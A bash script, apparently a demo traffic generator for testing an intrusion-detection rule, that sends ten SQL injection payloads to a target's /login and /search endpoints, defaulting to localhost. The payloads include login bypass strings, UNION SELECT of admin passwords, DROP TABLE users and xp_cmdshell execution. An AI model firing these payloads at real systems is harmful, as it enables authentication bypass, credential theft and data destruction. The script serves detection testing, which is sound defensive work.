#!/bin/bash
# =============================================================================
# attack_sql.sh — SQL Injection Attack Simulation
#
# Sends HTTP requests containing SQL injection payloads to a target web server.
# Detected by SqlInjectionRule via regex patterns on TCP payload (dst_port 80/443).
# Patterns: ' OR, UNION SELECT, DROP TABLE, --, xp_cmdshell
#
# Requirements: 6.1
# Tools: curl
# Usage:  ./demo/attack_sql.sh [target_url]
#         Default target is http://localhost:80
# =============================================================================

set -euo pipefail

TARGET="${1:-http://localhost:80}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="${SCRIPT_DIR}/attack_sql.log"

echo "[*] SQL Injection Attack against ${TARGET}" | tee "${LOG_FILE}"

PAYLOADS=(
  "' OR '1'='1"
  "' OR '1'='1' --"
  "admin' --"
  "' UNION SELECT * FROM users --"
  "'; DROP TABLE users; --"
  "' UNION SELECT username,password FROM admins --"
  "admin' OR '1'='1' --"
  "'; EXEC xp_cmdshell 'dir'; --"
  "' OR 1=1 --"
  "test@example.com' UNION SELECT 1,2,3,4 --"
)

echo "[*] Sending ${#PAYLOADS[@]} SQL injection payloads..." | tee -a "${LOG_FILE}"

for payload in "${PAYLOADS[@]}"; do
  echo "  → Sending: ${payload}" | tee -a "${LOG_FILE}"
  curl -s -o /dev/null -w "    HTTP %{http_code}\n" \
    --data-urlencode "username=${payload}" \
    --data-urlencode "password=password" \
    "${TARGET}/login" 2>&1 | tee -a "${LOG_FILE}"
  sleep 0.1
done

echo "[*] Sending payloads via URL parameters..." | tee -a "${LOG_FILE}"
for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "${payload}")
  echo "  → GET: ${encoded}" | tee -a "${LOG_FILE}"
  curl -s -o /dev/null -w "    HTTP %{http_code}\n" \
    "${TARGET}/search?q=${encoded}" 2>&1 | tee -a "${LOG_FILE}"
  sleep 0.1
done

echo "[*] SQL injection simulation complete." | tee -a "${LOG_FILE}"
